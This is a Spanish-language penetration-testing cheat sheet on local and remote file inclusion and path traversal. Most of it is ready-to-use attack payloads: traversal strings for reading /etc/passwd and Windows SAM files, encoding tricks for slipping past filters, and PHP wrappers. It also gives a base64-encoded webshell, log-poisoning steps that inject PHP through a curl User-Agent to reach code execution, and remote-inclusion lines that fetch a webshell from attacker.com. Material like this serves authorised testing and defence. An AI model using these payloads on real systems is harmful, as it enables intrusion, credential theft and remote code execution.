---
title: "LFI / RFI / Path Traversal"
description: "Path traversal permite leer archivos fuera del directorio restringido usando ../."
category: "Web"
date: 2026-07-18
---
# 📂 LFI / RFI / Path Traversal

Path traversal permite leer archivos fuera del directorio restringido usando `../`. LFI (Local File Inclusion) es la variante PHP donde el archivo incluido se **ejecuta como código**. RFI (Remote File Inclusion) permite incluir archivos remotos.

## Terminología

| Clase | CWE | Descripción |
|-------|-----|-------------|
| **Path Traversal** | CWE-22 | Lectura de archivos via `../` |
| **LFI** | CWE-98 | Inclusión de archivos locales interpretados como código |
| **RFI** | CWE-98 | Inclusión remota (URL) — casi extinto por `allow_url_include=Off` |

## Detección básica

```http
GET /index.php?page=../../../etc/passwd
GET /index.php?page=../../../../etc/passwd
GET /index.php?page=/etc/passwd    # Path absoluto
```

### Bypass de filtros

```
# Encoded
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double encoding
..%252f..%252f..%252fetc%252fpasswd

# Bypass de strip "../"
....//....//....//etc/passwd
..;/..;/..;/etc/passwd

# Null byte (PHP < 5.3.4)
../../../etc/passwd%00

# Windows
..\..\..\windows\win.ini
..\..\..\boot.ini
```

## PHP Wrappers (LFI → RCE)

### php://filter (lectura de código fuente)

```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
```

### php://filter chain (RCE sin archivos, Synacktiv 2022)

```
php://filter/convert.iconv.utf-8.utf-16|convert.base64-encode|.../resource=/etc/passwd
```

### data:// (RCE directo)

```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==
# Decodifica a: <?php system($_GET[cmd]); ?>
```

### phar:// (Deserialization)

```
phar://./uploads/payload.phar/test.txt
```

### expect:// (Si está instalado)

```
expect://id
```

## Log Poisoning (LFI → RCE)

### /var/log/apache2/access.log

```bash
# 1. Inyectar PHP en User-Agent
curl -A '<?php system($_GET["cmd"]); ?>' http://target.com/

# 2. Incluir el log via LFI
http://target.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id
```

### /proc/self/environ

```bash
# Si el server tiene CGI habilitado
http://target.com/index.php?page=../../../../proc/self/environ&cmd=id
```

### /proc/self/fd/

```bash
# A veces los logs se linkean a file descriptors
http://target.com/index.php?page=../../../../proc/self/fd/7
# Probar fd/2, fd/3... fd/50
```

## RFI (remoto)

```bash
# Si allow_url_include = On
http://target.com/index.php?page=http://attacker.com/webshell.txt
http://target.com/index.php?page=http://attacker.com/phpinfo.txt
```

## Windows específico

```
..\..\..\windows\win.ini
..\..\..\windows\repair\SAM
..\..\..\windows\system32\config\SAM
..\..\..\boot.ini
..\..\..\inetpub\wwwroot\web.config
```

## Herramientas

```bash
# LFISuite
python lfisuite.py

# dotdotpwn
dotdotpwn.pl -m http-url -u http://target.com/index.php?page=TRAVERSAL -k "root:"

# fff
fff -u http://target.com/index.php?page=FUZZ -w payloads.txt

# nuclei
nuclei -l alive.txt -t ~/nuclei-templates/vulnerabilities/lfi/
```

## CVEs recientes

| CVE | Año | Descripción |
|-----|-----|-------------|
| CVE-2025-60344 | 2025 | D-Link DSR path traversal |
| CVE-2024-23897 | 2024 | Jenkins file read |
| CVE-2024-1709 | 2024 | ConnectWise ScreenConnect LFI |

## Relacionado
- **File Upload** — phar:// deserialization, path traversal en ZIP
- **SSTI** — log poisoning (LFI → code execution)
- **XXE** — file reading via XML entities
- **Claude-BugHunter** (skill `hunt-lfi`)
